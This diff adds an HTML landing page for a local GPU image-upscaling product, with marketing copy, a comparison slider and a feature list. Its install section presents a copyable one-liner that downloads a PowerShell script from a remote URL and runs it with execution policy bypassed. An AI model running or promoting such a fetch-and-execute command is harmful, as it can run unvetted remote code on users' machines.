@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HyperScale AI Studio — Extreme Generative GPU Super-Resolution</title>
+    <meta name="description" content="Transform low-resolution photos into 8K masterpieces. Runs 100% locally on your NVIDIA GPU combining RealESRGAN, HAT, and Stable Diffusion ControlNet Tile.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Caveat:wght@600;700&family=DM+Sans:wght@400;500;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Navigation -->
+    <header class="navbar">
+        <div class="nav-container">
+            <a href="#" class="brand">
+                <div class="brand-logo">HS</div>
+                <span class="brand-text">HyperScale<span class="highlight">AI</span></span>
+            </a>
+            <nav class="nav-links">
+                <a href="#showcase">Showcase</a>
+                <a href="#features">Architecture</a>
+                <a href="#install" class="nav-cta motion-btn">Install Engine</a>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <main>
+        <section class="hero reveal-stagger">
+            <div class="hero-content">
+                <div class="pill-badge">
+                    <span class="pulse-dot"></span>
+                    <span>V2.5 Studio Release — Local NVIDIA Engine</span>
+                </div>
+                <h1 class="hero-title">Extreme Image Upscaling Powered by <span class="gradient-text">Generative AI</span></h1>
+                <p class="hero-subtitle">
+                    Reconstruct realistic skin pores, DSLR grain, and microscopic fabric weave at up to 127 Megapixels. Runs 100% locally on consumer GPUs with zero cloud subscriptions.
+                </p>
+                
+                <div class="cta-group" id="install">
+                    <!-- Manus / Motion-Primitives Terminal Command -->
+                    <div class="terminal-card">
+                        <div class="terminal-top">
+                            <div class="traffic-lights">
+                                <span class="tl red"></span>
+                                <span class="tl yellow"></span>
+                                <span class="tl green"></span>
+                            </div>
+                            <span class="terminal-label">Windows PowerShell One-Liner</span>
+                        </div>
+                        <div class="terminal-body">
+                            <code id="installCommand">python -c "import urllib.request, subprocess; open('install.ps1', 'wb').write(urllib.request.urlopen('https://hyperscale-ai-amsachs-projects.vercel.app/install.ps1').read()); subprocess.run(['powershell', '-ExecutionPolicy', 'Bypass', '-File', 'install.ps1'])"</code>
+                            <button class="copy-btn motion-btn" id="copyBtn" onclick="copyInstallCmd()">
+                                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                                <span>Copy Command</span>
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Direct Installer Option -->
+                    <div class="download-alt">
+                        <span>Prefer an executable file?</span>
+                        <a href="install.bat" download class="btn-download motion-link">
+                            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
+                            Download One-Click Installer (.bat)
+                        </a>
+                    </div>
+                </div>
+
+                <div class="stats-row">
+                    <div class="stat-box">
+                        <span class="stat-num">100%</span>
+                        <span class="stat-label">Local Private VRAM</span>
+                    </div>
+                    <div class="stat-box">
+                        <span class="stat-num">8x+</span>
+                        <span class="stat-label">Extreme Scale</span>
+                    </div>
+                    <div class="stat-box">
+                        <span class="stat-num">0.0ms</span>
+                        <span class="stat-label">Cloud Latency</span>
+                    </div>
+                    <div class="stat-box">
+                        <span class="stat-num">GFPGAN</span>
+                        <span class="stat-label">v1.4 Face Shield</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Interactive Motion-Primitives Drag Comparison Slider -->
+        <section class="showcase" id="showcase">
+            <div class="section-header">
+                <div class="pill-badge-sub">Real Synthesis Comparison</div>
+                <h2>Interactive Neural Reconstruction</h2>
+                <p>Drag the interactive handle left or right to inspect how Context-Aware Multi-Pass synthesis reconstructs true photographic fidelity compared to standard low-res input.</p>
+            </div>
+            
+            <div class="slider-wrapper">
+                <div class="img-comp-container" id="compContainer">
+                    <!-- After Image (Background layer) -->
+                    <div class="img-comp-layer layer-after">
+                        <img src="after.jpg" alt="Generative 8x Upscale Full Frame">
+                        <span class="img-tag tag-after">HyperScale Generative 8x (Full Frame)</span>
+                    </div>
+                    <!-- Before Image (Clipping layer via clip-path) -->
+                    <div class="img-comp-layer layer-before" id="layerBefore">
+                        <img src="before.jpg" alt="Original Low-Res Input Full Frame">
+                        <span class="img-tag tag-before">Original Input (Full Uncropped)</span>
+                    </div>
+                    <!-- Draggable Handle -->
+                    <div class="slider-handle" id="sliderHandle">
+                        <div class="handle-line"></div>
+                        <div class="handle-circle">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="15 18 9 12 15 6"></polyline></svg>
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="9 18 15 12 9 6"></polyline></svg>
+                        </div>
+                    </div>
+                </div>
+                <div class="slider-hint">💡 Hover and drag across the image to explore high-frequency texture synthesis.</div>
+            </div>
+        </section>
+
+        <!-- Manus / Realtime Colors Engineered Grid -->
+        <section class="features" id="features">
+            <div class="section-header">
+                <h2>Engineered for Uncompromising Fidelity</h2>
+                <p>Designed from the ground up to conquer VRAM limitations while producing pristine studio output.</p>
+            </div>
+            <div class="features-grid">
+                <div class="feature-card motion-card">
+                    <div class="feature-icon">✨</div>
+                    <h3>Multi-Pass Context Injection</h3>
+                    <p>Instead of stretching massive images blindly, our engine pauses at 4x to synthesize authentic micro-textures before executing the final mathematical stretch.</p>
+                </div>
+                <div class="feature-card motion-card">
+                    <div class="feature-icon">🛡️</div>
+                    <h3>GFPGAN v1.4 Face Protection</h3>
+                    <p>Automatic facial landmark detection isolates eyes and lips, applying dedicated neural recovery to prevent diffusion warping while keeping portraits crystalline.</p>
+                </div>
+                <div class="feature-card motion-card">
+                    <div class="feature-icon">⚡</div>
+                    <h3>Dynamic VRAM Tiling</h3>
+                    <p>Optimized with attention slicing, VAE tiling, and sequential CPU offloading. Comfortably processes massive 8K canvases on standard consumer 6GB/8GB GPUs.</p>
+                </div>
+                <div class="feature-card motion-card">
+                    <div class="feature-icon">🎛️</div>
+                    <h3>Frequency Separation Blend</h3>
+                    <p>Our dynamic high-pass frequency filter transfers only high-frequency textures while keeping 100% of your original image's lighting, geometry, and color grading intact.</p>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-content">
+            <p>&copy; 2026 HyperScale AI Studio. Designed for professional generative creators.</p>
+        </div>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html>
